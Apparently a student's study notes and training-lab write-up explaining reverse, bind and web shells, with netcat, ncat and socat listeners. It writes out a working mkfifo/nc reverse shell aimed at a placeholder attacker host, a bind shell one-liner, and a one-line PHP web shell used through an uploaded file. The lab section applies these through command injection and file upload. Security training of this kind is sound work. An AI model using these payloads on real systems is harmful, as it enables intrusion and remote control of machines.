# Shells Overview — Study Notes & Practical
## Overview
A shell is a method of remotely interacting with a target system after exploitation. It allows an attacker or tester to execute commands on a compromised machine.

Main types:
- Reverse Shell
- Bind Shell
- Web Shell

---

## Reverse Shell

### What it is
A reverse shell is when the target machine initiates a connection back to the attacker’s machine.

### How it works
1. Attacker sets up a listener
2. Target executes payload
3. Target connects back to attacker
4. Attacker gains shell access

### Listener example
nc -lvnp <port>

### Reverse shell payload example
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <attacker-ip> <port> >/tmp/f

### Key idea
- Outbound connection from target to attacker
- Often used to bypass firewall restrictions

---

## Bind Shell

### What it is
A bind shell is when the target opens a listening port and the attacker connects to it.

### How it works
1. Target opens a port
2. Shell is bound to that port
3. Attacker connects in
4. Attacker gains shell access

### Connection example
nc -nv <target-ip> <port>

### Bind shell payload example
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 <port> >/tmp/f

### Key idea
- Inbound connection from attacker to target
- Easier to detect and block in real environments

---

## Web Shell

### What it is
A web shell is a malicious script uploaded to a web server that allows command execution through HTTP requests.

### Example PHP web shell
<?php system($_GET['cmd']); ?>

### How it works
- Uploaded via file upload or vulnerability
- Stored in a web-accessible directory
- Commands executed through browser parameters

### Example usage
http://target/uploads/shell.php?cmd=whoami

### Key idea
- Command execution via web interface
- Often used when file upload vulnerabilities exist

---

## Tools Covered

Netcat (nc)
nc -lvnp <port>

rlwrap
rlwrap nc -lvnp <port>

Ncat
ncat -lvnp <port>
ncat --ssl -lvnp <port>

Socat
socat -d -d TCP-LISTEN:<port> STDOUT

---

## Vulnerabilities Used

- Command Injection
- Unrestricted File Upload

---

# Practical Lab

## Task 1: Command Injection → Reverse Shell

### Steps performed
- Identified command injection vulnerability in web application (port 8081)
- Started listener on AttackBox
nc -lvnp 4444
- Injected reverse shell payload into input field using semicolon separation
- Target executed payload and connected back to attacker
- Gained interactive shell access
- Navigated filesystem and located flag in root directory /

### Outcome
- Reverse shell successfully established
- Flag retrieved from / directory

---

## Task 2: Unrestricted File Upload → Web Shell

### Steps performed
- Identified file upload vulnerability (port 8082)
- Created PHP web shell:
<?php system($_GET['cmd']); ?>
- Uploaded file as shell.php
- Accessed uploaded file via:
http://target/uploads/shell.php?cmd=whoami
- Executed system commands through browser
- Gained command execution on target
- Navigated to root directory /
- Retrieved flag

### Outcome
- Web shell successfully deployed
- Remote command execution achieved via HTTP

---

## Key Takeaways
- Reverse shells initiate outbound connections from target to attacker
- Bind shells require inbound connection from attacker to target
- Web shells provide HTTP-based command execution
- Command injection and file upload vulnerabilities are high impact entry points
- Netcat is a core tool in shell-based exploitation workflows
